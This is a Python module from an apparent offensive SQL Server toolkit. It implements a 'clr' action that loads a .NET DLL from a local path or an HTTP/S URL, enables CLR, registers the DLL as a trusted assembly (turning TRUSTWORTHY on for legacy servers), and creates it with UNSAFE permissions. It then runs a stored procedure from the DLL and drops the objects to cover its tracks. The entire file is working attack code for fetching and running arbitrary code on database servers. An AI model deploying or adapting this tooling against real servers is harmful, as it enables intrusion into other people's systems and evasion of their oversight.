"""
CLR execution action for deploying and executing .NET assemblies.
"""

import hashlib
import os
import urllib.request
from typing import Optional, List
from loguru import logger

from ..base import BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from ...utils.common import (
    generate_random_string,
    get_hex_char,
    normalize_windows_path,
)


@ActionFactory.register(
    "clr", "Deploy and execute .NET CLR assemblies (DLL) on SQL Server"
)
class ClrExecution(BaseAction):
    """
    Deploy and execute .NET CLR assemblies on SQL Server.

    This action allows loading custom .NET DLLs (from local filesystem or HTTP/S)
    and executing stored procedures defined within them. The DLL must contain a
    class named 'StoredProcedures' with static methods representing SQL procedures.

    The workflow:
    1. Download/read the DLL bytes
    2. Compute SHA-512 hash for trusted assembly registration
    3. Enable CLR and register the assembly
    4. Create a stored procedure linked to the assembly method
    5. Execute the procedure
    6. Cleanup (drop procedure, assembly, and hash)
    """

    def __init__(self):
        super().__init__()
        self._dll_uri: str = ""
        self._function: str = "Main"

    def validate_arguments(self, args: List[str]) -> bool:
        """
        Validate arguments for CLR execution.

        Args:
            args: List of command line arguments
                Format: <dll_uri> [function]

        Returns:
            bool: True if validation succeeds

        Raises:
            ValueError: If arguments are invalid
        """
        named_args, positional_args = self._parse_action_arguments(args)

        # Parse DLL URI (required)
        if len(positional_args) >= 1:
            self._dll_uri = positional_args[0]
        else:
            raise ValueError("DLL URI is required. Usage: <dllURI> [function]")

        # Parse function name (optional, default: Main)
        if len(positional_args) >= 2:
            self._function = positional_args[1] if positional_args[1] else "Main"
        else:
            self._function = "Main"

        if not self._dll_uri:
            raise ValueError("DLL URI is required. Usage: <dllURI> [function]")

        return True

    def execute(self, database_context: DatabaseContext) -> bool:
        """
        Deploy and execute the CLR assembly.

        Args:
            database_context: The database context containing services

        Returns:
            True if execution succeeded; otherwise False
        """
        # Step 1: Get the SHA-512 hash for the DLL and its bytes
        library_hash, library_hex_bytes = self._convert_dll_to_sql_bytes(self._dll_uri)

        if not library_hash or not library_hex_bytes:
            logger.error("Failed to convert DLL to SQL-compatible bytes")
            return False

        if not database_context.config_service.set_configuration_option(
            "clr enabled", 1
        ):
            return False

        logger.info(f"SHA-512 Hash: {library_hash}")
        logger.info(f"DLL Bytes Length: {len(library_hex_bytes)}")

        assembly_name = generate_random_string(6)
        library_path = generate_random_string(6)

        drop_procedure = f"DROP PROCEDURE IF EXISTS [{self._function}];"
        drop_assembly = f"DROP ASSEMBLY IF EXISTS [{assembly_name}];"
        drop_clr_hash = f"EXEC sp_drop_trusted_assembly 0x{library_hash};"

        logger.info("Starting CLR assembly deployment process")

        try:
            if database_context.server.legacy:
                logger.info("Legacy server detected. Enabling TRUSTWORTHY property")
                database_context.query_service.execute_non_processing(
                    f"ALTER DATABASE [{database_context.query_service.execution_database}] SET TRUSTWORTHY ON;"
                )

            if not database_context.config_service.register_trusted_assembly(
                library_hash, library_path
            ):
                return False

            # Drop existing procedure and assembly if they exist
            database_context.query_service.execute_non_processing(drop_procedure)
            database_context.query_service.execute_non_processing(drop_assembly)

            # Step 3: Create the assembly from the DLL bytes
            logger.info("Creating the assembly from DLL bytes")
            database_context.query_service.execute_non_processing(
                f"CREATE ASSEMBLY [{assembly_name}] FROM 0x{library_hex_bytes} WITH PERMISSION_SET = UNSAFE;"
            )

            if not database_context.config_service.check_assembly(assembly_name):
                logger.error("Failed to create a new assembly")
                return False

            logger.success(f"Assembly '{assembly_name}' successfully created")

            # Step 4: Create the stored procedure linked to the assembly
            logger.info("Creating the stored procedure linked to the assembly")
            database_context.query_service.execute_non_processing(
                f"CREATE PROCEDURE [dbo].[{self._function}] AS EXTERNAL NAME [{assembly_name}].[StoredProcedures].[{self._function}];"
            )

            if not database_context.config_service.check_procedure(self._function):
                logger.error("Failed to create the stored procedure")
                return False

            logger.success(f"Stored procedure '{self._function}' successfully created")

            # Step 5: Execute the stored procedure
            logger.info(f"Executing the stored procedure '{self._function}'")
            database_context.query_service.execute_non_processing(
                f"EXEC {self._function};"
            )
            logger.success("Stored procedure executed successfully")

            return True

        except Exception as e:
            logger.error(f"Error during CLR assembly deployment: {e}")
            return False

        finally:
            # Cleanup (always executed)
            logger.info("Performing cleanup")
            database_context.query_service.execute_non_processing(drop_procedure)
            database_context.query_service.execute_non_processing(drop_assembly)
            database_context.query_service.execute_non_processing(drop_clr_hash)

            if database_context.server.legacy:
                logger.info("Resetting TRUSTWORTHY property")
                database_context.query_service.execute_non_processing(
                    f"ALTER DATABASE [{database_context.query_service.execution_database}] SET TRUSTWORTHY OFF;"
                )

    def get_arguments(self) -> List[str]:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return [
            "DLL URI (local path or HTTP/S URL)",
            "Function name to execute (default: Main)",
        ]

    def _convert_dll_to_sql_bytes(self, dll: str) -> tuple[str, str]:
        """
        Convert DLL to SQL-compatible bytes (from file or URL).

        Args:
            dll: Path to local file or HTTP/S URL

        Returns:
            Tuple of (sha512_hash_lowercase, dll_hex_bytes_uppercase)
        """
        if dll.lower().startswith("http://") or dll.lower().startswith("https://"):
            return self._convert_dll_to_sql_bytes_web(dll)
        else:
            # Normalize Windows path for local files
            normalized_dll = normalize_windows_path(dll)
            return self._convert_dll_to_sql_bytes_file(normalized_dll)

    def _convert_dll_to_sql_bytes_file(self, dll: str) -> tuple[str, str]:
        """
        Read a .NET assembly from local filesystem and convert to SQL format.

        Args:
            dll: Full path to the DLL on disk

        Returns:
            Tuple of (sha512_hash_lowercase, dll_hex_bytes_uppercase)
        """
        try:
            if not os.path.exists(dll):
                raise FileNotFoundError(f"File not found: {dll}")

            file_size = os.path.getsize(dll)
            logger.info(f"{dll} is {file_size} bytes")

            # Read all DLL bytes
            with open(dll, "rb") as f:
                dll_bytes = f.read()

            # Compute SHA-512 hash
            sha512 = hashlib.sha512()
            sha512.update(dll_bytes)
            hash_bytes = sha512.digest()

            # Convert hash to lowercase hex
            hash_chars = []
            for b in hash_bytes:
                hash_chars.append(get_hex_char((b >> 4) & 0xF, False))
                hash_chars.append(get_hex_char(b & 0xF, False))

            # Convert DLL bytes to uppercase hex
            dll_hex_chars = []
            for b in dll_bytes:
                dll_hex_chars.append(get_hex_char((b >> 4) & 0xF, True))
                dll_hex_chars.append(get_hex_char(b & 0xF, True))

            return ("".join(hash_chars), "".join(dll_hex_chars))

        except FileNotFoundError:
            logger.error(f"Unable to load {dll}")
            return ("", "")
        except Exception as e:
            logger.error(f"Error reading DLL file: {e}")
            return ("", "")

    def _convert_dll_to_sql_bytes_web(self, dll: str) -> tuple[str, str]:
        """
        Download a .NET assembly from HTTP/S and convert to SQL format.

        Args:
            dll: The URL of the DLL to download

        Returns:
            Tuple of (sha512_hash_lowercase, dll_hex_bytes_uppercase)
        """
        try:
            if not dll.startswith("http://") and not dll.startswith("https://"):
                raise ValueError(f"Invalid DLL URL: {dll}")

            logger.info(f"Downloading DLL from {dll}")

            # Download the DLL content
            with urllib.request.urlopen(dll) as response:
                dll_bytes = response.read()

            logger.info(f"DLL downloaded successfully, size: {len(dll_bytes)} bytes")

            # Compute SHA-512 hash
            sha512 = hashlib.sha512()
            sha512.update(dll_bytes)
            hash_bytes = sha512.digest()

            # Convert hash to lowercase hex
            hash_hex = "".join(f"{b:02x}" for b in hash_bytes)

            logger.info(f"SHA-512 hash computed: {hash_hex}")

            # Convert DLL bytes to uppercase hex
            dll_hex_string = "".join(f"{b:02X}" for b in dll_bytes)

            return (hash_hex, dll_hex_string)

        except urllib.error.URLError as e:
            logger.error(f"Failed to download DLL from {dll}. URL error: {e.reason}")
            return ("", "")
        except Exception as e:
            logger.error(f"An error occurred while processing the DLL: {e}")
            return ("", "")

    def get_arguments(self) -> List[str]:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return [
            "DLL URI (local path or HTTP/S URL)",
            "Function name to execute (default: Main)",
        ]
